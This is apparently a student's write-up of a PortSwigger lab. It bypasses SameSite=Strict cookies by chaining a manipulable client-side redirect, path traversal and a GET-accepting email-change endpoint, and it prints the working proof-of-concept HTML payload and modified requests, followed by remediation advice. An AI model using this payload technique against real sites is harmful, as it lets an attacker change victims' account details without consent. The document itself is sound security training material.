SameSite Strict Bypass via Client-Side Redirect

Platform: PortSwigger Web Security Academy
Difficulty: Practitioner
Category: Cross-Site Request Forgery (CSRF)
Tools: Burp Suite, Burp Repeater, JavaScript, Exploit Server
Status: ✅ Solved
Challenge: 30 Days of Web Security — Day 02

1. Objective

The objective of this laboratory was to bypass SameSite=Strict cookie restrictions by exploiting a client-side redirect mechanism.

The application contained a JavaScript redirect that constructed a destination URL using an attacker-controllable query parameter.

By combining this behavior with an email change endpoint that accepted GET requests, it was possible to perform a CSRF attack against an authenticated victim.

2. Attack Scenario

An attacker wants to change the email address associated with a victim's account.

The victim is authenticated to the vulnerable application.

The session cookie is protected using:

Set-Cookie: session=<REDACTED>; SameSite=Strict

This prevents the session cookie from being included in ordinary cross-site requests.

However, the application contains a client-side redirect that can be influenced using the postId parameter.

The attacker can use this redirect to trigger a second request originating from a page on the target site.

The browser may then include the victim's session cookie in that second request.

3. Identifying the Client-Side Redirect

I submitted a test comment on a blog post.

After submission, the application displayed a confirmation page:

GET /post/comment/confirmation?postId=1

The page automatically redirected back to the blog post.

I investigated this behavior using Burp Suite and identified the JavaScript resource:

/resources/js/commentConfirmationRedirect.js

The script used the postId query parameter to construct the redirect destination.

4. Testing Redirect Manipulation

I first replaced the postId value with an arbitrary string:

GET /post/comment/confirmation?postId=foo

Result: The browser was redirected to a URL containing /post/foo.

This confirmed that the query parameter influenced the destination path.

I then tested a path traversal sequence:

GET /post/comment/confirmation?postId=1/../../my-account

Result: The browser normalized the generated path and redirected to /my-account.

This demonstrated that the client-side redirect could be manipulated to reach other application endpoints.

5. Investigating SameSite Strict Behavior

I hosted a simple JavaScript redirect on the PortSwigger Exploit Server:

<!DOCTYPE html>
<html>
<body>

<script>
    document.location =
        "https://<LAB-HOST>/post/comment/confirmation?postId=1/../../my-account";
</script>

</body>
</html>

The initial navigation originated from the exploit server, which is a different site.

The browser therefore applied SameSite=Strict restrictions to the initial request.

However, the confirmation page's JavaScript initiated a second navigation from the vulnerable site itself.

This demonstrated how the application's client-side redirect could create a request in a different SameSite context.

6. Testing the Email Change Endpoint

I intercepted the email change request:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>
Content-Type: application/x-www-form-urlencoded

email=test%40example.net&submit=1

I sent the request to Burp Repeater and changed its method from POST to GET:

GET /my-account/change-email?email=csrf-lab08%40example.net&submit=1 HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>

Result: The server accepted the GET request, and the email address changed successfully.

This confirmed that the endpoint permitted a state-changing operation through GET.

7. Exploit Construction

I combined the client-side redirect with the vulnerable GET endpoint.

The final proof of concept was:

<!DOCTYPE html>
<html>
<body>

<script>
    document.location =
        "https://<LAB-HOST>/post/comment/confirmation?postId=1/../../my-account/change-email?email=csrf-lab08-victim%40example.net%26submit=1";
</script>

</body>
</html>
Why %26 Is Important

The payload includes:

%26submit=1

The encoded ampersand prevents submit=1 from being interpreted as a separate parameter of the initial confirmation-page request.

It allows the parameter to become part of the destination URL constructed by the client-side redirect.

8. Complete Attack Flow

The exploit works as follows:

The victim is authenticated to the vulnerable application.
The victim opens the attacker-controlled page.
The browser navigates to the comment confirmation page.
The initial cross-site request does not include the SameSite=Strict session cookie.
The confirmation page's JavaScript reads the manipulated postId parameter.
The JavaScript redirects to the email change endpoint.
The second request is initiated from the vulnerable site's page.
The browser includes the authenticated session cookie.
The server processes the GET request and changes the victim's email address.

The attacker does not need to know or steal the victim's session cookie.

9. Verification

I tested the redirect behavior and confirmed that the postId parameter could influence the destination.

I also verified that the email change endpoint accepted GET requests.

Finally, I hosted the combined proof of concept on the PortSwigger Exploit Server and delivered it to the simulated victim.

Result: The laboratory was successfully solved.

10. Root Cause

The vulnerability resulted from two weaknesses:

1. Unsafe client-side redirect

The application used an attacker-controllable parameter to construct a navigation destination without sufficiently restricting the target path.

2. State-changing GET endpoint

The email change endpoint accepted GET requests without adequate CSRF protection.

Together, these weaknesses allowed an attacker to bypass the intended protection provided by SameSite=Strict.

11. Security Impact

The confirmed impact was unauthorized modification of an authenticated user's email address.

Depending on the application's email verification and account recovery mechanisms, this could contribute to further account compromise.

The laboratory did not independently demonstrate a complete account takeover.

12. Remediation

Recommended protections include:

Never use GET requests for state-changing operations.
Require robust CSRF protection for sensitive actions.
Avoid constructing redirect destinations directly from untrusted input.
Use an allowlist of permitted redirect destinations.
Reject unexpected path traversal sequences in redirect parameters.
Use SameSite cookie restrictions as defense in depth, not as the only CSRF protection.
Require additional verification for sensitive account changes.
13. Key Takeaways

This laboratory demonstrated that SameSite=Strict does not prevent every CSRF attack.

A client-side redirect on the target site can change the context of a subsequent request, allowing the browser to include cookies that were withheld from the initial cross-site navigation.

I practiced:

Investigating JavaScript redirect behavior.
Manipulating query parameters used in URL construction.
Testing path traversal in redirect destinations.
Understanding SameSite cookie restrictions.
Identifying state-changing GET endpoints.
Combining multiple weaknesses into a complete CSRF exploit.
Documenting the attack chain, impact, and remediation.

Environment: PortSwigger Web Security Academy
Testing scope: Authorized educational laboratory only.
